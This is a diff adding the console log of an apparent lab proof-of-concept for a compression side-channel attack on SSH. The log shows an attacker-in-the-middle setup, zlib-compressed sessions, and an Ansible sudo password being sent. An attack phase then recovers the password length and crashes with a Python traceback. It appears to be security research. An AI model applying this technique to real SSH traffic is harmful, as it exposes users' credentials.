@@ -1,0 +1,98 @@
+
+========================================================================
+1. Wait for HTTP control APIs
+========================================================================
+  [ok] attacker reachable
+  [ok] client reachable
+
+========================================================================
+2. Inspect client SSH state
+========================================================================
+{
+  "ssh_connected": true,
+  "ssh_target": "attacker:2222",
+  "ssh_real_server": "server",
+  "ssh_username": "victim",
+  "ssh_send_compression": "zlib@openssh.com",
+  "ssh_recv_compression": "zlib@openssh.com",
+  "ssh_send_cipher": "chacha20-poly1305@openssh.com",
+  "ssh_recv_cipher": "chacha20-poly1305@openssh.com",
+  "ssh_send_mac": "<implicit>",
+  "ssh_recv_mac": "<implicit>",
+  "port_forwards": {
+    "redis_tunnel": {
+      "active": true,
+      "local": "0.0.0.0:6379",
+      "remote": "redis:6379"
+    },
+    "ansible_tunnel": {
+      "active": true,
+      "local": "0.0.0.0:15432",
+      "remote": "redis:6379",
+      "source": "ansible-playbook (per /send_secret_ansible call)"
+    }
+  },
+  "secret_value_length": 7,
+  "sudo_secret_length": 7,
+  "ansible_proc_alive": false,
+  "browser_connected": true
+}
+  [ok] compression: zlib@openssh.com
+  [ok] ansible LocalForward declared: {'active': True, 'local': '0.0.0.0:15432', 'remote': 'redis:6379', 'source': 'ansible-playbook (per /send_secret_ansible call)'}
+
+========================================================================
+3. Rotate the sudo secret via /set_sudo_secret
+========================================================================
+  [..] set_sudo_secret response: {'ok': True, 'sudo_secret_length': 7}
+  [ok] sudo password rotated (length=7)
+
+========================================================================
+4. Trigger /send_secret_ansible and capture the packet log
+========================================================================
+  [..] cleared packet log
+  [..] send_secret_ansible took 511 ms, response: {'ok': True, 'marker': 'password_sent', 'sudo_password_length': 7}
+  [ok] ansible reached the 'Sending become_password' marker
+  [..] 76 non-ack TCP segments captured around password-send
+  [ok] c->s traffic while ansible is running: 3969 bytes
+
+========================================================================
+5. Ansible attack: recover hunter2
+========================================================================
+  Phase 1: recovering CHANNEL_DATA length byte...
+    length byte = 0x08 (password length = 7) next_noise = 2 (185.0s)
+  Phase 2: recovering password...
+Traceback (most recent call last):
+  File "C:\Users\Fabian\Workspace\SSH-Compression-PoC\scripts\verify_ansible.py", line 214, in <module>
+    sys.exit(main())
+             ~~~~^^
+  File "C:\Users\Fabian\Workspace\SSH-Compression-PoC\scripts\verify_ansible.py", line 196, in main
+    r2 = http("POST", f"{ATTACKER_BASE}/run_attack_ansible",
+              body=phase2_body, content_type="application/json")
+  File "C:\Users\Fabian\Workspace\SSH-Compression-PoC\scripts\verify_ansible.py", line 48, in http
+    with urllib.request.urlopen(req, timeout=timeout) as resp:
+         ~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Program Files\Python313\Lib\urllib\request.py", line 189, in urlopen
+    return opener.open(url, data, timeout)
+           ~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^
+  File "C:\Program Files\Python313\Lib\urllib\request.py", line 489, in open
+    response = self._open(req, data)
+  File "C:\Program Files\Python313\Lib\urllib\request.py", line 506, in _open
+    result = self._call_chain(self.handle_open, protocol, protocol +
+                              '_open', req)
+  File "C:\Program Files\Python313\Lib\urllib\request.py", line 466, in _call_chain
+    result = func(*args)
+  File "C:\Program Files\Python313\Lib\urllib\request.py", line 1348, in http_open
+    return self.do_open(http.client.HTTPConnection, req)
+           ~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Program Files\Python313\Lib\urllib\request.py", line 1323, in do_open
+    r = h.getresponse()
+  File "C:\Program Files\Python313\Lib\http\client.py", line 1450, in getresponse
+    response.begin()
+    ~~~~~~~~~~~~~~^^
+  File "C:\Program Files\Python313\Lib\http\client.py", line 336, in begin
+    version, status, reason = self._read_status()
+                              ~~~~~~~~~~~~~~~~~^^
+  File "C:\Program Files\Python313\Lib\http\client.py", line 305, in _read_status
+    raise RemoteDisconnected("Remote end closed connection without"
+                             " response")
+http.client.RemoteDisconnected: Remote end closed connection without response
